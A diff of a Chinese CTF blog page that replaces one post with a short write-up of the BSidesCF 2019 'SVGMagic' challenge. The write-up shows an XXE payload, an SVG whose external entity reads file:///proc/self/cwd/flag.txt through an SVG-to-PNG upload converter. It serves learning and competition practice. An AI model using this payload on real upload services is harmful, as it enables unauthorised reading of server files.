@@ -161,7 +161,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [BJDCTF 2nd]EasyBaBa
+                                [BSidesCF 2019]SVGMagic
                             </h1>
                             
                                 <!--en-->
@@ -171,19 +171,19 @@
                                         Ro1ing
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-01-30</a>
+                                Date: <a href="#">2021-06-02</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.1
+                                    href="#">0.8
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">45</a></span>
+                                    <span class="post-words">words:<a href="#">147</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://Ro1ing.github.io/tag/KVyIyIkRw/">Misc</a>
+                                <a href="https://Ro1ing.github.io/tag/XluAwUvyI/">Web</a>
                                 
-                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
+                                <a href="https://Ro1ing.github.io/tag/_NjOj21yV/">文件上传</a>
                                 
                             </span>
                                         
@@ -192,9 +192,28 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>感觉 有东西压缩在里面 foremost分离</p>
-<p>解压出一个 里面都是出题人.jpg</p>
-<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
+                            <p>参考：https://www.rootnetsec.com/bsidessf-svgmagick/<br>
+文件上传<br>
+Convert SVG to PNG with Magic<br>
+上传Png：</p>
+<pre><code>Internal Server Error
+The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
+</code></pre>
+<p>上传Svg：<br>
+回显Svg源文件和转化后的png<br>
+利用SVG任意读取本地文件</p>
+<blockquote>
+<p>/proc/self 表示本地当前路径</p>
+</blockquote>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE note [
+&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;
+]&gt;
+&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;
+  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>得到</p>
 
                         </div>
                         
@@ -213,7 +232,7 @@
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</a></span>
+                                                <span><a href="https://Ro1ing.github.io/post/bsidescf-2019svgmagic/">https://Ro1ing.github.io/post/bsidescf-2019svgmagic/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -228,9 +247,9 @@
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/&sharesource=qzone&title=[BJDCTF 2nd]EasyBaBa&pics=https://Ro1ing.github.io/images/avatar.png?v=1623072542173&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/&sharesource=weibo&title=[BJDCTF 2nd]EasyBaBa + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1623072542173 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/bsidescf-2019svgmagic/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/bsidescf-2019svgmagic/&sharesource=qzone&title=[BSidesCF 2019]SVGMagic&pics=https://Ro1ing.github.io/images/avatar.png?v=1623072542173&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/bsidescf-2019svgmagic/&sharesource=weibo&title=[BSidesCF 2019]SVGMagic + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1623072542173 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -240,12 +259,12 @@
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://Ro1ing.github.io/tag/KVyIyIkRw/">#
-                                                Misc
+                        <a href="https://Ro1ing.github.io/tag/XluAwUvyI/">#
+                                                Web
                                                     </a>
                                                     
-                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
-                                                CTF
+                        <a href="https://Ro1ing.github.io/tag/_NjOj21yV/">#
+                                                文件上传
                                                     </a>
                                                     
                                                         
@@ -261,13 +280,13 @@
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
-                                                                                            [ASIS 2019]Unicorn shop
+                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/">
+                                                                                            CTFshow Web入门 命令执行篇
                                                                                         </a>
                                                                                         
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
-                                                                                                    [BJDCTF2020]Easy MD5
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/buuctf-misc-/">
+                                                                                                    BUUCTF Misc题
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
